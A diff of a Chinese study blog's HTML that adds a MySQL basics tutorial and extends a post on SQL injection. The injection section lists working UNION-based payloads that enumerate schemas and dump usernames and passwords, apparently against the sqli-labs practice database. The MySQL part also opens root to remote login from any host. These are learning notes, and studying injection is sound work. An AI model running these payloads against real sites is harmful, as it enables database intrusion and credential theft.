@@ -46,7 +46,7 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-9.1" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-10.1-mysql" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-inner">
     
     
@@ -54,12 +54,241 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/12/18/9.1/">9.1 sql注入</a>
+      <a class="p-name article-title" href="/2023/12/23/10.1-mysql/">10.1-mysql基础知识</a>
     </h1>
   
 
         <div class="article-meta">
-          <a href="/2023/12/18/9.1/" class="article-date">
+          <a href="/2023/12/23/10.1-mysql/" class="article-date">
+  <time datetime="2023-12-23T10:09:02.000Z" itemprop="datePublished">2023-12-23</time>
+</a>
+          
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><h3 id="进入MySQL："><a href="#进入MySQL：" class="headerlink" title="进入MySQL："></a>进入MySQL：</h3><p>进入MySQL的根目录下的bin目录(……..\MySQL5.7.26\bin)，再在上面栏中输入cmd,点击Ente进入该目录下的命令行窗口</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221193435010.png" alt="image-20231221193435010"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221193404933.png" alt="image-20231221193404933"></p>
+<p>或者选择直接打开命令行窗口cd到……..\MySQL5.7.26\bin目录下</p>
+<p>再在该窗口中输入，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p #-u用于指定登录MySQL服务器的用户名。-p: 用于指定登录MySQL服务器的密码。</span><br></pre></td></tr></table></figure>
+
+<p>进入root用户的登陆界面</p>
+<p>输入密码，直接Enter登陆，请记住MySQL密码，密码忘记了在找回密码很麻烦很麻烦！且MySQL卸载容易残留内容。</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221194231440.png" alt="image-20231221194231440"></p>
+<p>后续mysql数据库需要使用到远程操控（虚拟机之类）</p>
+<h3 id="解除远程限制"><a href="#解除远程限制" class="headerlink" title="解除远程限制"></a>解除远程限制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use mysql; # 使用mysql这个数据库</span><br><span class="line"></span><br><span class="line">update user set Host=&#x27;%&#x27; where User=&#x27;root&#x27;; # 更新&quot;user&quot;表中&quot;User&quot;列为&#x27;root&#x27;的行，将相应行												的&quot;Host&quot;列设置为&#x27;%&#x27;。给与root用户在任何主机访												问权限</span><br><span class="line">flush privileges; #重新加载授权表，使对用户权限的更改立即生效</span><br></pre></td></tr></table></figure>
+
+<p>use xxxx;  选择数据库,后续SQL操作将在xxx数据库中进行,它不会真正“使用”某个数据库,而是选择操作对象为某个数据库。</p>
+<p>   <img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231212151102681.png" alt="image-20231212151102681"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231212151329959.png" alt="image-20231212151329959"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231212151413849.png" alt="image-20231212151413849"></p>
+<p>然后就可以通过MySQL辅助软件从物理机连接虚拟机了，查询好虚拟机ip</p>
+<h3 id="MySQL数据库操作"><a href="#MySQL数据库操作" class="headerlink" title="MySQL数据库操作"></a>MySQL数据库操作</h3><p>MySQL名字要求：可以使用字母、数字和下划线，必须以字母开头，长度不能超过64个字符，MySQL对于英语大小写很敏感，取名尽量要有意义，避免使用MySQL保留字命名如SELECT、INSERT、UPDATE、DELETE等</p>
+<p>展示已有数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221201539328.png" alt="image-20231221201539328"></p>
+<p>创建数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database database_name;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221201605389.png" alt="image-20231221201605389"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221201633645.png" alt="image-20231221201633645"></p>
+<p>删除数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database database_name;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221201714590.png" alt="image-20231221201714590"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221201757982.png" alt="image-20231221201757982"></p>
+<p>选择&#x2F;使用数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use database_name;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use security;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221201819432.png" alt="image-20231221201819432"></p>
+<p>显示库表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221201913871.png" alt="image-20231221201913871"></p>
+<h3 id="MySQL表操作"><a href="#MySQL表操作" class="headerlink" title="MySQL表操作"></a>MySQL表操作</h3><p>创建表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table table_name(列名 类型(长度要求),列名 类型(长度要求),......);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table student(id int,name char(10),age int,sex char(5));</span><br></pre></td></tr></table></figure>
+
+<p>查看表结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc table_name;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc student;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221202441686.png" alt="image-20231221202441686"></p>
+<p>删除表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table table_name;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table student;</span><br></pre></td></tr></table></figure>
+
+<p>表添加列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table table_name add 列名 类型(*);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table student add height int(10);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221202748910.png" alt="image-20231221202748910"></p>
+<p>表删除列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table table_name drop 列名;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table student drop height;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221202855242.png" alt="image-20231221202855242"></p>
+<p>列改名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 change column 被改列名 要改成的名字 类型;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table student change column height high int(3);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221203326100.png" alt="image-20231221203326100"></p>
+<p>列更改数据类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify column 要改的列名 数据类型</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table student modify column high char(10);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221203522506.png" alt="image-20231221203522506"></p>
+<p>修改表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 前表名 rename to 要改成的表名;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter table student rename to student_table1;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221203738726.png" alt="image-20231221203738726"></p>
+<h3 id="MySQL数据操作"><a href="#MySQL数据操作" class="headerlink" title="MySQL数据操作"></a>MySQL数据操作</h3><p>增加&#x2F;插入数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into u&#x27;s表名 (列名1,列名,列名1,...) value (数据,数据,数据,数据,...);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into student_table(id,name,age,sex,high) value (001,&quot;张三&quot;,10,&quot;男&quot;,160);</span><br><span class="line">insert into student_table(id,name,age,sex,high) value (002,&quot;丽丽&quot;,12,&quot;女&quot;,140);</span><br><span class="line">select * from student_table;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221205019219.png" alt="image-20231221205019219"></p>
+<p>删除数据项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from 表名 where 列名=条件;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from student_table where high=140;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221205110202.png" alt="image-20231221205110202"></p>
+<p>更新数据项</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 列名=数据 where 条件;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update student_table  set age=12;</span><br><span class="line">update student_table set age=12 where name=&#x27;张三&#x27;;</span><br><span class="line">select * from student_table;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>between</p>
+<p> 最小值 and 最大值</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create table stu(id int,name char(10),age int,sex char(5),high int(3));</span><br><span class="line">insert into stu(id,name,age,sex,high) value (001,&quot;张三&quot;,10,&quot;男&quot;,160);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (002,&quot;丽丽&quot;,12,&quot;女&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (003,&quot;王五&quot;,11,&quot;男&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (004,&quot;李四&quot;,12,&quot;男&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (005,&quot;王伟&quot;,11,&quot;男&quot;,140);</span><br><span class="line">insert into stu(id,name,age,sex,high) value (006,&quot;华子&quot;,12,&quot;男&quot;,140);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 where 列名 between 最小值 and 最大值；</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from stu where id between 2 and 4;</span><br><span class="line">select * from stu where id&gt;=2 and id&lt;=4;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221210837199.png" alt="image-20231221210837199"></p>
+<p>空值 null</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 where 列名 is null；（判断这一列有空值）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from stu where high is null;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221211025740.png" alt="image-20231221211025740"></p>
+<p>in(额外取值)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：select * from 表名 where 列名 in （值1，值2，…）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from stu where age in(10,11,9);</span><br><span class="line">select * from stu where age in(10,11);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221211137684.png" alt="image-20231221211137684"></p>
+<p>like 好像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% 代表任意字符 ,_一个下划线代替一个字符</span><br><span class="line">select * from 表名 where 列名 like ‘通配符 特征 通配符’；</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from stu where name like &#x27;王_&#x27;;</span><br><span class="line">insert into stu(id,name,age,sex,high) value (009,&quot;王八蛋&quot;,11,&quot;男&quot;,140);</span><br><span class="line">select * from stu where name like &#x27;王%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>as 为表名称或者列名称指定别名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name as mz from stu where name like &#x27;王_&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221212215304.png" alt="image-20231221212215304"></p>
+<p>union合并两个或多个select语句结果集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from stu;</span><br><span class="line">select id from stu as st where st.name like &#x27;张_&#x27; union select name from stu where age=9;</span><br><span class="line"></span><br><span class="line">select id from stu as st where st.name like &#x27;张_&#x27; union select name from stu where high=140;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221212548523.png" alt="image-20231221212548523"></p>
+<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p>order by</p>
+<p>规则：升序排序 asc （默认可省略） 降序排序 desc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单列 select * from 表名 order by 列名 asc或者 desc；</span><br><span class="line">多列 select * from 表名 order by 列名 asc或者 desc，列名2 asc或者desc，…;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from stu order by age;</span><br><span class="line">select * from stu order by age desc;</span><br><span class="line">select * from stu order by age asc,id desc;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221213042573.png" alt="image-20231221213042573"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221213055455.png" alt="image-20231221213055455"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221213108260.png" alt="image-20231221213108260"></p>
+<h3 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h3><p>GROUP BY 和 DISTINCT 都是用于从数据库中选择唯一值的 SQL 子句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct age from stu;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221213323424.png" alt="image-20231221213323424"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select age,count(*) from stu group by age;</span><br><span class="line">select age from stu group by age;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231221213548201.png" alt="image-20231221213548201"></p>
+<p>GROUP BY 语句用于将数据按照一个或多个列进行分组，然后对每个组应用一个聚合函数以得到每个组的统计结果。GROUP BY 通常用于在查询中生成汇总信息。</p>
+<p>DISTINCT 语句用于从查询结果中选择唯一的值。它可以用于从一个或多个列中选择唯一的值，也可以用于选择整行的唯一值。</p>
+<h3 id="统计函数"><a href="#统计函数" class="headerlink" title="统计函数"></a>统计函数</h3><p>语法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 统计函数（列名），统计函数（列名2）... from 表名;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>count：计算指定列或表达式的行数，可以用于统计记录数量。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) FROM table_name; 将返回表中的记录数。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,count(*) from stu group by id;</span><br></pre></td></tr></table></figure>
+
+<p>sum：计算指定列或表达式的总和。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(salary) FROM employees; 将返回 employees 表中 salary 列的总和。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sum(high) from stu;</span><br></pre></td></tr></table></figure>
+
+<p>avg：计算指定列或表达式的平均值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT AVG(age) FROM students; 将返回 students 表中 age 列的平均值。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select avg(high) from stu;</span><br></pre></td></tr></table></figure>
+
+<p>max：返回指定列或表达式的最大值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MAX(price) FROM products; 将返回 products 表中 price 列的最大值。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select max(id) from stu;</span><br></pre></td></tr></table></figure>
+
+<p>MIN：返回指定列或表达式的最小值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MIN(quantity) FROM inventory; 将返回 inventory 表中 quantity 列的最小值。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(id) from stu;</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+  </div>
+ 
+</article>
+
+
+  
+    <article id="post-9.1-sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/18/9.1-sql%E6%B3%A8%E5%85%A5/">9.1 sql注入</a>
+    </h1>
+  
+
+        <div class="article-meta">
+          <a href="/2023/12/18/9.1-sql%E6%B3%A8%E5%85%A5/" class="article-date">
   <time datetime="2023-12-18T06:47:33.000Z" itemprop="datePublished">2023-12-18</time>
 </a>
           
@@ -180,6 +409,149 @@
 <li>列的数据类型也应该兼容,如数值和字符串。</li>
 <li>连接后的结果集不包含重复的数据行。</li>
 </ul>
+<hr>
+<h4 id="sql注入解释"><a href="#sql注入解释" class="headerlink" title="sql注入解释"></a>sql注入解释</h4><p>​	SQL 注入就是指 Web  应用程序对用户输入的数据合法性没有过滤或者是判断，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul>
+<li><p>传递给后端的参数是可以控制的</p>
+</li>
+<li><p>参数内容会被带入到数据库查询</p>
+</li>
+<li><p>变量未存在过滤或者过滤不严谨</p>
+</li>
+</ul>
+<h4 id="sql注入常用函数（-）"><a href="#sql注入常用函数（-）" class="headerlink" title="sql注入常用函数（*****）"></a>sql注入常用函数（*****）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version()                 # 查看数据库版本</span><br><span class="line">database()                # 查看当前数据库名</span><br><span class="line">user()                    # 查看当前数据库用户</span><br><span class="line">system_user()             # 查看系统用户名</span><br><span class="line">group_concat()            # 把数据库中的某列数据或某几列数据合并为一个字符串</span><br><span class="line">@@datadir                 # 查看数据库路径</span><br><span class="line">@@version_compile_os      # 查看操作系统</span><br></pre></td></tr></table></figure>
+
+<p>PS：在<strong>mysql5.0</strong>版本之后，MySQL数据库中就存放着一个名为information_schema的数据库</p>
+<h5 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h5><ul>
+<li><p>系统自带（大概是为了更好的管理数据）</p>
+</li>
+<li><p>存储了当前数据库服务器的数据库对象的结构信息,如表名、字段名、索引等。（对于sql注入来说是一个很重要的条件-大概）</p>
+</li>
+<li><p>它的表<strong>不需要使用USE语句</strong>切换,直接使用information_schema.表名进行查询。（个表特点，sql注入更方便）</p>
+</li>
+<li><pre><code>tables表 - 存储所有表名
+
+columns表 - 存储所有字段名
+
+schemata表 - 存储所有数据库名
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 可以用来查询数据库、表、字段的结构信息。</span><br><span class="line"></span><br><span class="line">- 支持跨数据库访问,**在任何数据库中都可以使用**。</span><br><span class="line"></span><br><span class="line">![image-20231223184227814](https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20231223184227814.png)</span><br><span class="line"></span><br><span class="line">```sql</span><br><span class="line"># 查询所有的数据库名</span><br><span class="line">select schema_name from information_schema.schemata limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的所有表名</span><br><span class="line">select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询指定数据库security中的指定数据表users的所有列名</span><br><span class="line">select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+<h4 id="sql注入-注释"><a href="#sql注入-注释" class="headerlink" title="sql注入-注释"></a>sql注入-注释</h4><p>两种：#      – （两条杠后面有空格）</p>
+<p>#url中<code>#</code>号是用来指导浏览器动作的，对服务器端无用。所以，HTTP请求中使用 <code>get</code> 传参时不包括<code>#</code>，因为使用 <code>#</code> 闭合无法注释，</p>
+<p>实际使用– 时可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- -</span><br><span class="line">或</span><br><span class="line">--+</span><br></pre></td></tr></table></figure>
+
+<p>表示注释</p>
+<p>而使用<code>-- </code>（有个空格），在传输过程中空格会被忽略，同样导致无法注释，所以在get请求传参注入时才会使用 <code>--+</code> 的方式来闭合，因为<code>+</code>会被解释成空格。</p>
+<p>注释后面的语句不会被执行，我们可以在注释前执行sql语句获取信息。</p>
+<h4 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h4><p><strong>数字型注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/users.php?id=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 数字型驻点常见的注入语句(Payload)</span><br><span class="line">select * from 表名 where id=1 and 1=1</span><br><span class="line"></span><br><span class="line"># 查询数据库名和版本</span><br><span class="line">id=-1 union select 1,database(),version() --+</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中的表名</span><br><span class="line">id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;) --+</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中指定表名中的列名字段</span><br><span class="line">id=-1 union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;) --+</span><br><span class="line"></span><br><span class="line"># 查询指定表中的数据</span><br><span class="line">id=-1 union select 1,database(),(select group_concat(username,&#x27;:&#x27;,password) from secyrity.users) --+  </span><br></pre></td></tr></table></figure>
+
+<p><strong>字符型注入点</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 where name=&#x27;admin&#x27; and 1=1 &#x27;&#x27;</span><br><span class="line"># 字符型常见的注入语句(Payload)</span><br><span class="line"></span><br><span class="line"># 后台语句 - SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1</span><br><span class="line">id=-1&#x27;) union select 1,database(),version() --+</span><br><span class="line">id=-2&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure>
+
